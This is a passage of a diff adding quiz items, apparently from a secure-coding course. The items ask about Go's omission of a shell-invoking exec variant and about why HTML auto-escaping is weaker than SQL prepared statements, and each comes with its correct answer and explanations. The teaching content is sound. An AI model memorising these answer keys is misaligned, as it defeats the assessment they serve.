+        { "id": "A", "text": "Lesson: when a language designer omits the dangerous primitive, they prevent an entire bug class for every program in the ecosystem. Trade-off: developers who genuinely need a shell pipeline have to invoke `/bin/sh -c \"...\"` themselves, making the dangerous behavior explicit and visible in code review — and harder to do accidentally." },
+        { "id": "B", "text": "Lesson: Go is a slow language and cannot afford fast shell calls. Trade-off: performance." },
+        { "id": "C", "text": "Lesson: Go forbids running external programs entirely." },
+        { "id": "D", "text": "Lesson: Go has no security model. Trade-off: more bugs." }
+      ],
+      "correctAnswer": "A",
+      "mechanisticExplanation": "Default-safe API design: omit the unsafe variant from the easy path. Developers can still get shell behavior, but they must opt in by spelling it out (`exec.Command(\"/bin/sh\", \"-c\", cmd)`). The opt-in is loud — easy to spot in review and easy to grep for in audits. Compare to Python having both `subprocess.run` and `os.system`: developers reach for `os.system` partly because it's there and short.",
+      "distractorAnalysis": {
+        "B": "Speed isn't the design driver.",
+        "C": "Go runs external programs fine.",
+        "D": "Go has a strong security posture; this API is part of it."
+      },
+      "trapCategories": ["synthesis", "default-safe-api"],
+      "diagramRef": null,
+      "gameRef": null
+    },
+    {
+      "id": "L16-Q25",
+      "type": "SYNTHESIS",
+      "difficulty": "Advanced",
+      "topic": "Untrusted input as parsed language — generalization",
+      "stem": "A new framework promises 'safe by default' templating that auto-escapes user data inserted into HTML. Why is this fundamentally weaker than the prepared-statement model used for SQL?",
+      "choices": [
+        { "id": "A", "text": "Auto-escaping is context-sensitive (HTML attribute vs JS context vs CSS context vs URL all need different escapes), and the templater must guess which context applies — bugs in context detection are a common source of XSS. Prepared statements avoid this by parsing the template into a typed AST first; HTML has no equivalent universal AST that all browsers parse identically." },
+        { "id": "B", "text": "It's not weaker; auto-escaping is exactly the same as prepared statements." },
+        { "id": "C", "text": "Auto-escaping is slower." },
+        { "id": "D", "text": "Auto-escaping requires a database connection." }
+      ],
+      "correctAnswer": "A",
+      "mechanisticExplanation": "HTML is not a single grammar — it's a soup of contexts (element body, attribute value, script tag, style tag, URL attribute, event handler) each with different escaping rules. Auto-escaping templaters try to track context with static analysis, but errors here cause XSS. SQL's grammar is much more uniform; placeholders bind into a single typed slot. Prepared statements work because the SQL grammar is stable and parameterizable; HTML is neither.",
+      "distractorAnalysis": {
+        "B": "Different mechanisms, different guarantees.",
+        "C": "Speed isn't the issue.",
+        "D": "Templating doesn't require a DB."
+      },
+      "trapCategories": ["synthesis", "context-sensitivity"],
+      "diagramRef": null,
+      "gameRef": null
+    }
+  ]
+}
